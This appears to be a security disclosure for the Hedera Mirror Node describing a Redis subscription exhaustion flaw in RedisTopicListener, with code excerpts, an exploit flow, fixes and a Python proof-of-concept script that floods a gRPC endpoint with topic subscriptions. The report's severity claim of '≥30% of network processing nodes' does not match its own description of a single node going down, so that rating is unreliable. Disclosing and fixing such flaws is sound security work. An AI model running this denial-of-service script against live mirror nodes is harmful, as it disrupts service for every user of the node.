### Title
Unbounded Redis Channel Subscription Growth via Distinct Topic ID Flooding in `RedisTopicListener`

### Summary
`RedisTopicListener.getSharedListener()` stores one shared `Flux` per distinct topic ID in an unbounded `ConcurrentHashMap`. Each unique topic ID causes a new Redis channel subscription to be registered via `ReactiveRedisMessageListenerContainer.receive()`. An unprivileged attacker can open many gRPC connections, each subscribing to different valid topic IDs, growing the map and Redis subscriptions without bound until Redis server-side resources (memory, connection output buffers) are exhausted, causing node-wide pub/sub delivery failure.

### Finding Description

**Exact code path:**

`RedisTopicListener.java`, `getSharedListener()`, lines 59–62:
```java
protected Flux<TopicMessage> getSharedListener(TopicMessageFilter filter) {
    Topic topic = getTopic(filter);
    return topicMessages.computeIfAbsent(topic.getTopic(), key -> subscribe(topic));
}
```

`topicMessages` is declared as an unbounded `ConcurrentHashMap` (line 43):
```java
private final Map<String, Flux<TopicMessage>> topicMessages;
// ...
this.topicMessages = new ConcurrentHashMap<>();
```

`getTopic()` maps each `topicId` to a unique channel name (lines 64–66):
```java
private Topic getTopic(TopicMessageFilter filter) {
    return ChannelTopic.of(String.format("topic.%d", filter.getTopicId().getId()));
}
```

`subscribe()` calls `r.receive(...)` which issues a Redis `SUBSCRIBE` command for that channel (line 72):
```java
return container
    .flatMapMany(r -> r.receive(Collections.singletonList(topic), channelSerializer, messageSerializer))
```

The `.share()` at line 79 means multiple subscribers to the **same** topic share one Redis subscription — but each **distinct** topic ID creates exactly one new Redis channel subscription that persists as long as any subscriber holds the connection open.

**Root cause:** There is no cap on the size of `topicMessages`, no per-client limit on how many distinct topics can be subscribed, and no global limit on total active Redis channel subscriptions. The only per-connection limit is `maxConcurrentCallsPerConnection = 5` (gRPC Netty config), which is trivially bypassed by opening additional connections.

**Why the `topicExists` check is insufficient:** `TopicMessageServiceImpl.topicExists()` (lines 94–106) requires the topic to exist in the entity repository when `checkTopicExists = true` (the default). On a live Hedera network, topic IDs are public, sequential, and there are thousands of valid topics. An attacker can enumerate them via the public REST API or mirror node query endpoints with no authentication required.

**Exploit flow:**
1. Attacker queries the public REST API to enumerate N valid topic IDs (e.g., 10,000).
2. Attacker opens M gRPC connections (no authentication required on the gRPC port).
3. Each connection issues 5 concurrent `subscribeTopic` calls (the per-connection limit), each targeting a different valid topic ID.
4. With M connections × 5 calls = 5M distinct topic subscriptions, each backed by a Redis `SUBSCRIBE` command.
5. The `topicMessages` map grows to 5M entries; the `ReactiveRedisMessageListenerContainer` issues 5M `SUBSCRIBE` commands on its connection.
6. Redis server-side memory for tracking pub/sub subscriptions is exhausted; the `client-output-buffer-limit` for the pub/sub connection is breached; Redis disconnects the listener container.
7. The `retryWhen(Retry.backoff(Long.MAX_VALUE, ...))` at line 78 causes continuous reconnect attempts, amplifying the load.
8. Legitimate topic message delivery fails node-wide.

### Impact Explanation
Redis pub/sub channel subscriptions consume server-side memory proportional to the number of subscribed channels. Redis's default `client-output-buffer-limit` for pub/sub clients is 32 MB hard / 8 MB soft. Flooding the listener container with thousands of channel subscriptions exhausts this buffer, causing Redis to forcibly disconnect the `ReactiveRedisMessageListenerContainer`. Since this container is a singleton shared across all topics (line 30–55, `this.container` is a cached `Mono`), its disconnection stops message delivery for **all** topics on the node, not just the attacker's topics. This matches the "shutdown of ≥30% of network processing nodes" severity classification: a single mirror node's gRPC message delivery is completely halted.

### Likelihood Explanation
The gRPC `subscribeTopic` endpoint is unauthenticated and publicly accessible (standard Hedera Mirror Node deployment). Valid topic IDs are publicly enumerable with no rate limiting on the REST API. Opening thousands of gRPC connections is trivial with standard tooling (e.g., `grpc-client`, Python `grpcio`). The attack is repeatable: even after the attacker disconnects, the `retryWhen` loop in `subscribe()` will attempt to re-establish Redis subscriptions, prolonging the disruption. No special privileges, credentials, or insider knowledge are required.

### Recommendation
1. **Cap the `topicMessages` map size**: Replace `ConcurrentHashMap` with a bounded cache (e.g., Caffeine `Cache` with a `maximumSize`) to limit the number of concurrent Redis channel subscriptions.
2. **Add a global subscription limit**: Track total active distinct-topic subscriptions with an `AtomicInteger` and reject new subscriptions beyond a configurable threshold.
3. **Rate-limit `subscribeTopic` per source IP**: Apply gRPC server-side interceptors or a load-balancer policy to limit subscription request rates per client.
4. **Limit connections per IP**: Configure the Netty server to cap total connections per remote address, not just concurrent calls per connection.
5. **Set Redis `client-output-buffer-limit`** conservatively for the pub/sub connection and monitor subscription count via metrics.

### Proof of Concept
```python
import grpc
import threading
from proto import consensus_service_pb2_grpc, consensus_service_pb2
from proto import timestamp_pb2, basic_types_pb2

# Step 1: Enumerate valid topic IDs from public REST API
# GET https://mainnet-public.mirrornode.hedera.com/api/v1/topics?limit=1000
valid_topic_ids = list(range(1, 10001))  # simplified; use REST API in practice

TARGET = "mirror-node-grpc-host:5600"

def subscribe_topic(topic_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    request = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=topic_id),
        consensusStartTime=timestamp_pb2.Timestamp(seconds=0, nanos=0),
    )
    try:
        for _ in stub.subscribeTopic(request):
            pass  # keep connection open
    except Exception:
        pass

# Step 2: Open many connections, each subscribing to a different topic
threads = []
for topic_id in valid_topic_ids:
    t = threading.Thread(target=subscribe_topic, args=(topic_id,), daemon=True)
    t.start()
    threads.append(t)

# Step 3: Hold connections open — Redis subscriptions accumulate
# Result: Redis pub/sub memory exhausted, ReactiveRedisMessageListenerContainer
# disconnected, all topic message delivery on the node fails.
import time; time.sleep(3600)
```
